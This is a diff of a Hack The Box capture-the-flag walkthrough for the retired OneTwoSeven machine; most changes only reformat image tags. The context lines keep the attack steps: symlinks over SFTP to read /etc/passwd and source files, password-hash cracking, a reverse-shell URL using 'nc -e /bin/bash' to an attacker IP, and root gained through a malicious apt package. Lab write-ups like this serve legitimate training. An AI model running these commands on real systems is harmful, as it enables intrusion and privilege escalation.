@@ -18,10 +18,10 @@ This post documents the complete walkthrough of OneTwoSeven, a retired vulnerabl
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -63,9 +63,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 Wow. This is as good as nothing. Anyways, here's how the site looks like.
 
-<a class="image-popup">
-![45319c32.png](/assets/images/posts/onetwoseven-htb-walkthrough/45319c32.png)
-</a>
+
+{% include image.html image_alt="45319c32.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/45319c32.png" %}
+
 
 Well, at least we have `index.php`. :smile:
 
@@ -73,27 +73,27 @@ Well, at least we have `index.php`. :smile:
 
 The site has four features: SFTP, static file hosting, IPv6, DDoS Protection.
 
-<a class="image-popup">
-![2272d817.png](/assets/images/posts/onetwoseven-htb-walkthrough/2272d817.png)
-</a>
 
-<a class="image-popup">
-![bb184a09.png](/assets/images/posts/onetwoseven-htb-walkthrough/bb184a09.png)
-</a>
+{% include image.html image_alt="2272d817.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/2272d817.png" %}
 
-<a class="image-popup">
-![bc57a7a3.png](/assets/images/posts/onetwoseven-htb-walkthrough/bc57a7a3.png)
-</a>
 
-<a class="image-popup">
-![fe6edc42.png](/assets/images/posts/onetwoseven-htb-walkthrough/fe6edc42.png)
-</a>
+
+{% include image.html image_alt="bb184a09.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/bb184a09.png" %}
+
+
+
+{% include image.html image_alt="bc57a7a3.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/bc57a7a3.png" %}
+
+
+
+{% include image.html image_alt="fe6edc42.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/fe6edc42.png" %}
+
 
 Checking the HTML source of `index.php` shows something interesting.
 
-<a class="image-popup">
-![59854b9e.png](/assets/images/posts/onetwoseven-htb-walkthrough/59854b9e.png)
-</a>
+
+{% include image.html image_alt="59854b9e.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/59854b9e.png" %}
+
 
 The link to "Admin" is greyed out and it's hosted at `60080/tcp`. It should be clear from the anti-DDoS description, that there's no point in brute-forcing directories or files. Other pages include `signup.php`, `stats.php`, and `attribution.php`.
 
@@ -101,33 +101,33 @@ The link to "Admin" is greyed out and it's hosted at `60080/tcp`. It should be c
 
 Let's grab an account first above all else.
 
-<a class="image-popup">
-![58357d05.png](/assets/images/posts/onetwoseven-htb-walkthrough/58357d05.png)
-</a>
+
+{% include image.html image_alt="58357d05.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/58357d05.png" %}
+
 
 Pretty retro with the static homepage hosting. Oops. I'm not that old. :wink:
 
-<a class="image-popup">
-![01432007.png](/assets/images/posts/onetwoseven-htb-walkthrough/01432007.png)
-</a>
+
+{% include image.html image_alt="01432007.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/01432007.png" %}
+
 
 Time to log in to our SFTP account.
 
-<a class="image-popup">
-![9a360798.png](/assets/images/posts/onetwoseven-htb-walkthrough/9a360798.png)
-</a>
+
+{% include image.html image_alt="9a360798.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/9a360798.png" %}
+
 
 This is really old school man. It reminds me of the personal home page hosting I got from my ISP twenty-years ago. I missed the sound of the modem dialing...
 
-<a class="image-popup">
-![aad133da.png](/assets/images/posts/onetwoseven-htb-walkthrough/aad133da.png)
-</a>
+
+{% include image.html image_alt="aad133da.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/aad133da.png" %}
+
 
 I literally hit a brick wall with `index.html`. Nonetheless, I can remove the brick wall to reveal directory index.
 
-<a class="image-popup">
-![0277e9c2.png](/assets/images/posts/onetwoseven-htb-walkthrough/0277e9c2.png)
-</a>
+
+{% include image.html image_alt="0277e9c2.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/0277e9c2.png" %}
+
 
 There you go. What's next? We can create symlinks to see if we are lucky enough to view certain files.
 
@@ -135,15 +135,15 @@ There you go. What's next? We can create symlinks to see if we are lucky enough 
 sftp> ln -s /etc/passwd passwd
 ```
 
-<a class="image-popup">
-![bb5b8b73.png](/assets/images/posts/onetwoseven-htb-walkthrough/bb5b8b73.png)
-</a>
+
+{% include image.html image_alt="bb5b8b73.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/bb5b8b73.png" %}
+
 
 What do we have here?
 
-<a class="image-popup">
-![99b20eae.png](/assets/images/posts/onetwoseven-htb-walkthrough/99b20eae.png)
-</a>
+
+{% include image.html image_alt="99b20eae.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/99b20eae.png" %}
+
 
 Notice the first entry is different from the rest? Can we look at other files and directories too?
 
@@ -151,43 +151,43 @@ Notice the first entry is different from the rest? Can we look at other files an
 sftp> ln -s /var/www/html/index.php index.txt
 ```
 
-<a class="image-popup">
-![c29f6ad6.png](/assets/images/posts/onetwoseven-htb-walkthrough/c29f6ad6.png)
-</a>
+
+{% include image.html image_alt="c29f6ad6.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/c29f6ad6.png" %}
+
 
 Yes we can!
 
-<a class="image-popup">
-![10c0f31c.png](/assets/images/posts/onetwoseven-htb-walkthrough/10c0f31c.png)
-</a>
+
+{% include image.html image_alt="10c0f31c.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/10c0f31c.png" %}
+
 
 Long story short, I went ahead to symlink `signup.phhp`, `stats.php`, and the `root` directory.
 
-<a class="image-popup">
-![c983d96a.png](/assets/images/posts/onetwoseven-htb-walkthrough/c983d96a.png)
-</a>
 
-<a class="image-popup">
-![84349ec1.png](/assets/images/posts/onetwoseven-htb-walkthrough/84349ec1.png)
-</a>
+{% include image.html image_alt="c983d96a.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/c983d96a.png" %}
+
+
+
+{% include image.html image_alt="84349ec1.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/84349ec1.png" %}
+
 
 _`signup.php`_
 
-<a class="image-popup">
-![9d39efaf.png](/assets/images/posts/onetwoseven-htb-walkthrough/9d39efaf.png)
-</a>
+
+{% include image.html image_alt="9d39efaf.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/9d39efaf.png" %}
+
 
 _`stats.php`_
 
-<a class="image-popup">
-![27ee381f.png](/assets/images/posts/onetwoseven-htb-walkthrough/27ee381f.png)
-</a>
+
+{% include image.html image_alt="27ee381f.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/27ee381f.png" %}
+
 
 _`root` directory_
 
-<a class="image-popup">
-![773ac36f.png](/assets/images/posts/onetwoseven-htb-walkthrough/773ac36f.png)
-</a>
+
+{% include image.html image_alt="773ac36f.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/773ac36f.png" %}
+
 
 Now that we know how the password is generated, we can simply SFTP ourself to other accounts to satisfy our curiosity. First up, `ots-yODc2NGQ` because it's coming from the loopback interface.
 
@@ -196,41 +196,41 @@ Now that we know how the password is generated, we can simply SFTP ourself to ot
 f528764d
 ```
 
-<a class="image-popup">
-![aa9e6e70.png](/assets/images/posts/onetwoseven-htb-walkthrough/aa9e6e70.png)
-</a>
+
+{% include image.html image_alt="aa9e6e70.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/aa9e6e70.png" %}
+
 
 What a surprise, `user.txt` is here.
 
-<a class="image-popup">
-![d5610a6e.png](/assets/images/posts/onetwoseven-htb-walkthrough/d5610a6e.png)
-</a>
+
+{% include image.html image_alt="d5610a6e.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/d5610a6e.png" %}
+
 
 ### Administration Backend
 
 Recall the link to Admin was on `60080/tcp`? We can make use of ProxyCommand to run `ssh` and forward a local port on our attacking machine to the remote port of `60080/tcp` like so.
 
-<a class="image-popup">
-![8a9e17f6.png](/assets/images/posts/onetwoseven-htb-walkthrough/8a9e17f6.png)
-</a>
+
+{% include image.html image_alt="8a9e17f6.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/8a9e17f6.png" %}
+
 
 Ignore the "Connection closed" message and check out the ports listening on our attacking machine.
 
-<a class="image-popup">
-![de7d28ad.png](/assets/images/posts/onetwoseven-htb-walkthrough/de7d28ad.png)
-</a>
+
+{% include image.html image_alt="de7d28ad.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/de7d28ad.png" %}
+
 
 Time to check out if we can access the administration backend.
 
-<a class="image-popup">
-![d78c9958.png](/assets/images/posts/onetwoseven-htb-walkthrough/d78c9958.png)
-</a>
+
+{% include image.html image_alt="d78c9958.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/d78c9958.png" %}
+
 
 Voila! Only to be stonewalled by a login form. :angry:
 
-<a class="image-popup">
-![a3814d42.png](/assets/images/posts/onetwoseven-htb-walkthrough/a3814d42.png)
-</a>
+
+{% include image.html image_alt="a3814d42.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/a3814d42.png" %}
+
 
 Fret not. We have the Vim swap file of `/var/www/html-admin/login.php`. Maybe that will tell us the username and password?
 
@@ -238,43 +238,43 @@ Fret not. We have the Vim swap file of `/var/www/html-admin/login.php`. Maybe th
 # vim -r login.php.swp
 ```
 
-<a class="image-popup">
-![43e3840c.png](/assets/images/posts/onetwoseven-htb-walkthrough/43e3840c.png)
-</a>
 
-<a class="image-popup">
-![3f99c614.png](/assets/images/posts/onetwoseven-htb-walkthrough/3f99c614.png)
-</a>
+{% include image.html image_alt="43e3840c.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/43e3840c.png" %}
+
+
+
+{% include image.html image_alt="3f99c614.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/3f99c614.png" %}
+
 
 Awesome. Let's send the hash to JtR for cracking.
 
-<a class="image-popup">
-![fe1a61bc.png](/assets/images/posts/onetwoseven-htb-walkthrough/fe1a61bc.png)
-</a>
+
+{% include image.html image_alt="fe1a61bc.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/fe1a61bc.png" %}
+
 
 It's login time!
 
-<a class="image-popup">
-![040781de.png](/assets/images/posts/onetwoseven-htb-walkthrough/040781de.png)
-</a>
+
+{% include image.html image_alt="040781de.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/040781de.png" %}
+
 
 Looks like I'm not the only one here. :laughing: How do you separate the wheat from the chaff? I've applied a light-touch brute-forcing prior to this and found the directory index of `/addons`. Check out the timestamps of the default "plugins" surrounded by the red box.
 
-<a class="image-popup">
-![da5d93d8.png](/assets/images/posts/onetwoseven-htb-walkthrough/da5d93d8.png)
-</a>
+
+{% include image.html image_alt="da5d93d8.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/da5d93d8.png" %}
+
 
 Well, it appears that we can upload "plugins" as well. The "disabled" button is immaterial.
 
-<a class="image-popup">
-![ce02fa6c.png](/assets/images/posts/onetwoseven-htb-walkthrough/ce02fa6c.png)
-</a>
+
+{% include image.html image_alt="ce02fa6c.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/ce02fa6c.png" %}
+
 
 Not only that, we can download the "plugins" too!
 
-<a class="image-popup">
-![17395127.png](/assets/images/posts/onetwoseven-htb-walkthrough/17395127.png)
-</a>
+
+{% include image.html image_alt="17395127.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/17395127.png" %}
+
 
 I downloaded all the default "plugins", and something funky is going on with them, especially `ots-man-addon.php`:
 
@@ -377,9 +377,9 @@ Content-Type: text/plain;charset=UTF-8
 File uploaded successfull.y
 ```
 
-<a class="image-popup">
-![67d22bc7.png](/assets/images/posts/onetwoseven-htb-walkthrough/67d22bc7.png)
-</a>
+
+{% include image.html image_alt="67d22bc7.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/67d22bc7.png" %}
+
 
 Sweet.
 
@@ -391,29 +391,29 @@ With remote command execution, we can get ourselves a low-privilege shell with `
 http://onetwoseven.htb:60080/menu.php?addon=ots-endgame.php&0=nc 10.10.12.49 1234 -e /bin/bash
 ```
 
-<a class="image-popup">
-![aec0f561.png](/assets/images/posts/onetwoseven-htb-walkthrough/aec0f561.png)
-</a>
+
+{% include image.html image_alt="aec0f561.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/aec0f561.png" %}
+
 
 Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.
 
-<a class="image-popup">
-![883cd4ed.png](/assets/images/posts/onetwoseven-htb-walkthrough/883cd4ed.png)
-</a>
+
+{% include image.html image_alt="883cd4ed.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/883cd4ed.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `www-admin-data`'s account, I noticed that `www-admin-data` is able to `sudo` `apt-get update`, `apt-get upgrade`, and preserve certain environment variables.
 
-<a class="image-popup">
-![2097c992.png](/assets/images/posts/onetwoseven-htb-walkthrough/2097c992.png)
-</a>
+
+{% include image.html image_alt="2097c992.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/2097c992.png" %}
+
 
 And if you check `/etc/apt/source.list.d/onetwoseven.list` then the road to `root` is imminent.
 
-<a class="image-popup">
-![7ee640f6.png](/assets/images/posts/onetwoseven-htb-walkthrough/7ee640f6.png)
-</a>
+
+{% include image.html image_alt="7ee640f6.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/7ee640f6.png" %}
+
 
 Here's the game plan:
 
@@ -439,9 +439,9 @@ Next, set up the directory structure on my attacking machine.
 
 And since I'm using Kali Linux, I'll download the latest `ca-certificates` from the Kali Linux repository.
 
-<a class="image-popup">
-![f2478a05.png](/assets/images/posts/onetwoseven-htb-walkthrough/f2478a05.png)
-</a>
+
+{% include image.html image_alt="f2478a05.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/f2478a05.png" %}
+
 
 Run the following commands in the same directory:
 
@@ -543,27 +543,27 @@ cd - &>/dev/null
 
 Once that's done, we can launch our attack.
 
-<a class="image-popup">
-![56d5b622.png](/assets/images/posts/onetwoseven-htb-walkthrough/56d5b622.png)
-</a>
+
+{% include image.html image_alt="56d5b622.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/56d5b622.png" %}
+
 
 Install the "evil" package.
 
-<a class="image-popup">
-![3d7ac752.png](/assets/images/posts/onetwoseven-htb-walkthrough/3d7ac752.png)
-</a>
+
+{% include image.html image_alt="3d7ac752.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/3d7ac752.png" %}
+
 
 Meanwhile, at our `nc` listener, a `root` shell appears...
 
-<a class="image-popup">
-![1e71c2ab.png](/assets/images/posts/onetwoseven-htb-walkthrough/1e71c2ab.png)
-</a>
+
+{% include image.html image_alt="1e71c2ab.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/1e71c2ab.png" %}
+
 
 Getting `root.txt` is trivial when you have a `root` shell.
 
-<a class="image-popup">
-![207b2a6a.png](/assets/images/posts/onetwoseven-htb-walkthrough/207b2a6a.png)
-</a>
+
+{% include image.html image_alt="207b2a6a.png" image_src="/208c1863-9d75-45f1-9a63-a56e87f6c38c/207b2a6a.png" %}
+
 
 :dancer:
 
